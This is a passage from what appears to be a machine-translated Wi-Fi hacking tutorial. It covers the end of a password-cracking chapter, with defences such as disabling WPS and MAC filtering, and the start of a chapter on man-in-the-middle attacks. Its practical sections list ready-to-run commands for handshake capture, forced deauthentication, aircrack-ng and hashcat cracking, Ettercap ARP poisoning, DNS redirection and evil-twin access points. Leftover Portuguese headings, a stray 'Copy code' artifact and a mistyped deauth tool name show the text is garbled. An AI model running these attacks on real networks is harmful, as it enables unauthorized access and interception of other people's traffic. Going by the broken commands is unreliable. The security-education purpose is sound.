    \ attacks that exploit this vulnerability.\n\n●       Disabling WPS: Access the\
    \ router's administration interface and disable the WPS option.\n\n# MAC Filtering\n\
    \nImplement MAC address filtering to allow only authorized devices onto the network.\n\
    \n● MAC Filtering Configuration: Access the router's administration interface\
    \ and configure MAC address filtering by adding the MAC addresses of authorized\
    \ devices.\n\n# Network Segmentation\n\nSegmenting the network can limit the impact\
    \ of an attack by isolating different types of traffic and devices.\n\n● Use of\
    \ VLANs: Configure VLANs on the router to isolate traffic from critical devices\
    \ and general-purpose devices.\n\n# Monitoring and Detection\n\nImplement monitoring\
    \ systems to detect password cracking attempts and other suspicious activity.\n\
    \n● Use of IDS/IPS: Tools like Snort or Zeek can be configured to monitor network\
    \ traffic and alert you to suspicious activity, such as password cracking attempts.\n\
    \n# Practical Examples of Password Cracking\n\nTo illustrate how the tools and\
    \ techniques discussed can be applied in practice, here are some examples of executing\
    \ password cracking attacks.\n\n# Handshake Capture with Airodump-ng\n\nPut the\
    \ Interface in Monitor Mode:\n\nbash\n\nsudo airmon-ng start wlan0\n\nCapture\
    \ the Handshake:\n\nbash\n\nsudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w\
    \ capture wlan0mon\n\nForce Deauthentication to Capture the Handshake:\n\nbash\n\
    \nsudo airplay --deauth 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon\n\
    \n# Password Cracking with Aircrack-ng\n\nDictionary File Usage:\n\nbash\n\nsudo\
    \ aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture-01.cap\n\nBrute Force\
    \ with Aircrack-ng: Create a password list file with all possible combinations\
    \ and use it with Aircrack-ng:\n\nbash\n\ncrunch 8 12 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\
    \ -o brute-force-list.txt\n\nsudo aircrack-ng -w brute-force-list.txt -b 00:11:22:33:44:55\
    \ capture-01.cap\n\n# Using Hashcat\n\nConvert Handshake to Hashcat Format:\n\n\
    bash\n\nCopy code\n\nhcxpcaptool -z capture.hccapx capture-01.cap\n\nPassword\
    \ Cracking with Hashcat:\n\nbash\n\nhashcat -m 2500 capture.hccapx wordlist.txt\n\
    \nWi-Fi password cracking is a crucial technique that involves varied methods\
    \ including capturing handshakes, brute force and dictionary attacks, and the\
    \ use of specialized tools such as Aircrack-ng, Hashcat and John the Ripper. Protecting\
    \ your network against these attacks requires implementing strong and complex\
    \ passwords, regularly updating passwords, using WPA3, disabling WPS, MAC filtering,\
    \ network segmentation, and continuous monitoring. Understanding and applying\
    \ these techniques allows cybersecurity professionals to effectively secure Wi-Fi\
    \ networks, ensuring data security and network integrity.\n\nCapítulo 6: Ataques\
    \ Man-in-the-Middle\n\n# \n\n* * *\n\n# Introduction to MITM Attacks\n\nMan-in-the-Middle\
    \ (MITM) attacks are one of the most serious and common threats on Wi-Fi networks.\
    \ In a MITM attack, the attacker intercepts and possibly modifies communication\
    \ between two parties without them knowing. This allows the attacker to steal\
    \ sensitive information, such as login credentials and personal data, or inject\
    \ malicious data into the communication.\n\n# MITM Attack Concept\n\nA MITM attack\
    \ occurs when an attacker positions himself between two devices that are communicating.\
    \ The attacker can then intercept, record, and alter the data transmitted between\
    \ these devices. There are several techniques for carrying out a MITM attack,\
    \ including ARP spoofing, DNS redirection, and creating fake access points.\n\n\
    # Executing MITM on Wi-Fi Networks\n\nTo perform a MITM attack on a Wi-Fi network,\
    \ the attacker must first gain access to the network. Once connected, the attacker\
    \ can use various techniques to intercept network traffic.\n\n# Spoofing de ARP\n\
    \nARP (Address Resolution Protocol) spoofing is a common technique used in MITM\
    \ attacks. ARP is responsible for mapping IP addresses to MAC addresses on the\
    \ local network. ARP spoofing involves sending spoofed ARP messages to associate\
    \ the attacker's MAC address with the IP address of a legitimate device on the\
    \ network.\n\n●       Using Ettercap: Ettercap is a powerful tool for performing\
    \ ARP spoofing attacks.\n\nInstallation:\n\nbash\n\nsudo apt install ettercap-graphical\n\
    \nExecution:\n\nStart Ettercap in graphical mode:\n\nbash\n\nsudo ettercap -G\n\
    \nSelect the network interface and start sniffing.\n\nAdd victims (target devices)\
    \ and select \"ARP poisoning\" as the attack method.\n\nLaunch the attack to intercept\
    \ traffic between victims.\n\n# DNS Redirection\n\nDNS redirection involves manipulating\
    \ DNS responses to redirect traffic destined for a legitimate website to a malicious\
    \ website controlled by the attacker.\n\n● Using Dnsmasq: Dnsmasq is a tool that\
    \ can be configured to provide DNS and DHCP services, facilitating DNS redirection.\n\
    \nInstallation:\n\nbash\n\nsudo apt install dnsmasq\n\nSettings: Edit the Dnsmasq\
    \ configuration file (/etc/dnsmasq.conf) to add redirection entries:\n\ntext\n\
    \naddress=/example.com/192.168.1.100\n\nIn this example, any request for example.com\
    \ will be redirected to 192.168.1.100, the IP address of the malicious server.\n\
    \n# Creating Fake Access Points\n\nCreating a fake access point (Evil Twin) is\
    \ another technique used in MITM attacks. The attacker creates an access point\
    \ with the same SSID as a legitimate access point, tricking users into connecting\
    \ to the fake access point.\n\n● Uso do Airbase-ng: Airbase-ng is a tool from\
    \ the Aircrack-ng package used to create fake access points.\n\nInstallation:\n\
    \nbash\n\nsudo apt install aircrack-ng\n\nExecution:\n\nPut the network interface\
    \ in monitor mode:\n\nbash\n\nsudo airmon-ng start wlan0\n\nCreate the fake access\
    \ point:\n\nbash\n\nsudo airbase-ng -e \"NomeDoSSID\" wlan0mon\n\nThis command\
    \ creates an access point with the SSID \"SSIDName\". Users who connect to this\
    \ access point will have their traffic intercepted by the attacker.\n\n# Tools\
    \ Used in MITM Attacks\n\nSeveral tools make it easy to perform MITM attacks on\
    \ Wi-Fi networks. Some of the most popular include Ettercap, Wireshark, and MITMf.\n\
    \n# Ettercap\n\nEttercap is a network sniffing and spoofing tool that supports\
    \ various MITM techniques, including ARP spoofing and data injection.\n\nInstallation:\n\
    \nbash\n\nsudo apt install ettercap-graphical\n\nFunctionalities:\n\n○       ARP\
    \ spoofing\n\n○       DNS spoofing\n\n○       Packet injection\n\n○       Password\
    \ capture\n\n# Wireshark"
